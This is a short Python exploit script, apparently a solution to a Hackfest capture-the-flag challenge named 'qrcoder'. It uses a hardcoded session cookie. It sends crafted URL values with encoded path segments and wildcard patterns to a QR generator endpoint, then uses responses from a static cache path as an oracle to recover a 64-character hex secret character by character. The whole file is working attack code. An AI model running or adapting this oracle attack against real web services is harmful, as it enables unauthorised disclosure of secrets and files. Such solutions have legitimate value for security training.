import requests
import string
  
cookies = {"session":".eJwFwYENgDAIBMBdmKCUWsBteCiJMxh39-6lp-imYa3YJZ1ujNIYV0KyUjegEgzu1bHibDt8UMutZ_tEw-Uq-n4WChWT.ZIR7ig.uc8_K9EFlBTjoUrEem-IIs8Lhg4"}

a = "abcdef0123456789"
prefix = ""

def check_cache(data):
    res = requests.get(f"http://qrcoder.challenges.hackfest.tn:8000/static/users/{data}[!=]**",cookies=cookies)
    if res.status_code == 200:
        return False
    else:
        return True

for i in range(0,64):
    for j in a:
        print(prefix+j)
        data = {"url":f"//?%2fusers%2f{prefix+j}[!=]**"}
        res = requests.post("http://qrcoder.challenges.hackfest.tn:8000/qr_generator",data=data,cookies=cookies)
        if check_cache(prefix+j):
            prefix = prefix + j
            continue
        else:
            continue
